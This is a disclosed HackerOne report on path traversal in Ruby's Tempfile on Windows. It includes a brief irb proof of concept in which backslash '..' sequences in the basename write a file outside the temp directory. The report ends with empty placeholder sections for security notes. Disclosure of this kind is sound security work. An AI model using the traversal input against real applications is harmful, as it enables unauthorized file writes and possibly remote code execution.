---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1131465'
original_report_id: '1131465'
title: Path traversal in Tempfile on windows OS due to unsanitized backslashes
weakness: Path Traversal
team_handle: ruby
created_at: '2021-03-20T19:21:50.073Z'
disclosed_at: '2021-04-07T12:46:20.750Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 53
asset_identifier: https://github.com/ruby/ruby
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- path-traversal
---

# Path traversal in Tempfile on windows OS due to unsanitized backslashes

## Metadata

- HackerOne Report ID: 1131465
- Weakness: Path Traversal
- Program: ruby
- Disclosed At: 2021-04-07T12:46:20.750Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi team,

##Summary

We've noticed that both arguments (basename and ext) of Tempfile on Windows are vulnerable to a path traversal which could allow unintentional file creating in arbitrary writable directories. 

Tempfile often has a user control either by basename or ext (or both). 

## PoC

~~~
irb(main):029:0> Tempfile.open(["\\..\\..\\..\\..\\..\\Users\\rootx\\malicious",".rb"])
=> #<Tempfile:C:/Users/rootx/AppData/Local/Temp\..\..\..\..\..\Users\rootx\malicious20210321-22472-fvuodx.rb>
irb(main):030:0> puts `dir C:\\Users\\rootx\\`
 Volume in drive C has no label.
 Volume Serial Number is C0F2-8D87

 Directory of C:\Users\rootx

... REDACTED ...
21-03-2021  00:45                 0 malicious20210321-22472-fvuodx.rb
... REDACTED ...
~~~

The same can be accomplished via ext argument. 

Thanks,
Harsh and Rahul,
HTTPVoid

## Impact

Unintentional file creation in an arbitrary directory. Could potentially cause RCE in RoR applications.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
